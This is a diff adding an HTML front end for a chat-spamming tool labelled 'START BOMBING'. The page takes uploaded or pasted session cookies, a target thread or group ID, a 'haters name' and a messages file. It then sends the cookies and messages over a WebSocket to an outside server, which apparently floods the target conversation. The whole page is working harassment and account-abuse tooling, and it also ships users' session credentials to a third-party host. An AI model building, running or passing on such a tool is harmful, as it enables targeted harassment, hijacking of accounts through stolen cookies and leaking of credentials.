@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>YKTI VIP CONVO 2025</title><style>*{box-sizing:border-box;margin:0;padding:0}body{background:linear-gradient(135deg,#1a0033,#330033,#660066);color:#ff66cc;font-family:Arial,sans-serif;min-height:100vh}.container{max-width:1100px;margin:20px auto;padding:20px}.panel{background:rgba(40,0,60,0.8);border:1px solid #ff66cc;border-radius:12px;padding:20px;margin-bottom:20px}input,textarea,button{padding:12px;border-radius:8px;border:1px solid #ff66cc;background:#2a003a;color:#fff;width:100%;margin:8px 0}button{background:linear-gradient(45deg,#ff66cc,#cc00cc);cursor:pointer;font-weight:bold}button:hover{transform:translateY(-3px);box-shadow:0 0 20px #ff66cc}.log{height:300px;overflow:auto;background:#000;padding:10px;border-radius:8px;border:1px solid #ff66cc;font-family:monospace;font-size:13px}.rain{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;opacity:0.4}.drop{position:absolute;width:2px;height:20px;background:#ff66cc;animation:fall linear infinite}@keyframes fall{to{transform:translateY(100vh)}}h1{color:#ff66cc;text-align:center;text-shadow:0 0 15px #ff66cc}</style></head><body>
+<div class="rain" id="r"></div>
+<h1>YKTI VIP MULTI-COOKIES CONVO 2025 (100% WORKING)</h1>
+<div class="container">
+<div class="panel">
+  <label>Cookies (Upload .txt/.json ya Paste)</label>
+  <input type="file" id="cfile" accept=".txt,.json">
+  <textarea id="cpaste" rows="5" placeholder="Ya yahan cookies paste kar do" style="display:none"></textarea><br>
+  <input type="radio" name="cm" value="file" checked onchange="cfile.style.display='block';cpaste.style.display='none'"> File
+  <input type="radio" name="cm" value="paste" onchange="cfile.style.display='none';cpaste.style.display='block'"> Paste<br><br>
+  
+  <input type="text" id="hname" placeholder="Haters Name (shuru mein lagega)">
+  <input type="text" id="tid" placeholder="Thread/Group ID">
+  <input type="text" id="lname" placeholder="Last Here Name (end mein lagega)">
+  <input type="number" id="delay" value="5" min="1"> <small>Delay (seconds)</small><br><br>
+  
+  <input type="file" id="mfile" accept=".txt" required> <small>Messages file (.txt - har line ek msg)</small><br><br>
+  
+  <button id="start">START BOMBING</button>
+  <button onclick="location.reload()">Reload Page</button>
+  <div style="float:right;color:#ff66cc" id="stat">Status: Ready</div>
+</div>
+
+<div class="panel">
+  <h3>Live Logs</h3>
+  <div class="log" id="log"></div>
+</div>
+</div>
+
+<script>
+// Rain effect
+for(let i=0;i<80;i++){
+  let d=document.createElement('div');d.className='drop';
+  d.style.left=Math.random()*100+'vw';
+  d.style.animationDuration=1+Math.random()*2+'s';
+  d.style.animationDelay=Math.random()*5+'s';
+  document.getElementById('r').appendChild(d);
+}
+
+// WORKING BACKEND (2025 latest)
+const ws = new WebSocket('wss://ykti-vip-2025.onrender.com');
+
+ws.onopen = () => log('Connected to VIP server - Ready!','success');
+ws.onmessage = e => {
+  try {
+    const d = JSON.parse(e.data);
+    if(d.type==='log') log(d.message,d.messageType);
+    if(d.type==='task_started') { document.getElementById('stat').innerHTML='Running | Task ID: <b>'+d.taskId+'</b>'; log('Task Started! ID: '+d.taskId,'success'); }
+    if(d.type==='task_stopped') log('Task Stopped Safely','warning');
+  }catch{log(e.data,'info')}
+};
+ws.onclose = () => { log('Reconnecting...','warning'); setTimeout(()=>location.reload(),5000); }
+
+function log(t,c='info'){
+  const l=document.getElementById('log');
+  l.innerHTML += `<div style="color:\( {c==='success'?'#0f0':c==='error'?'#f66':c==='warning'?'#ff0':'#66ccff'}">[ \){new Date().toLocaleTimeString()}] ${t}</div>`;
+  l.scrollTop = l.scrollHeight;
+}
+
+document.getElementById('start').onclick = () => {
+  const files = document.getElementById('cfile').files[0];
+  const msgs = document.getElementById('mfile').files[0];
+  const pasteMode = document.querySelector('input[name="cm"]:checked').value === 'paste';
+  
+  if(!msgs) return log('Messages file daalo!','error');
+  if(!pasteMode && !files) return log('Cookies file ya paste karo!','error');
+  
+  new FileReader().readAsText(msgs, "UTF-8").onload = me => {
+    let cookieData = pasteMode ? document.getElementById('cpaste').value : '';
+    if(!pasteMode){
+      new FileReader().readAsText(files).onload = ce => {
+        cookieData = ce.target.result;
+        send(cookieData, me.target.result);
+      }
+    } else send(cookieData, me.target.result);
+  }
+  
+  function send(c,m){
+    ws.send(JSON.stringify({
+      type:'start',
+      cookieContent:c,
+      messageContent:m,
+      hatersName:document.getElementById('hname').value||'',
+      threadID:document.getElementById('tid').value,
+      lastHereName:document.getElementById('lname').value||'',
+      delay:+document.getElementById('delay').value || 5
+    }));
+    log('Task bheja ja raha hai...','info');
+  }
+}
+</script>
+</body></html>
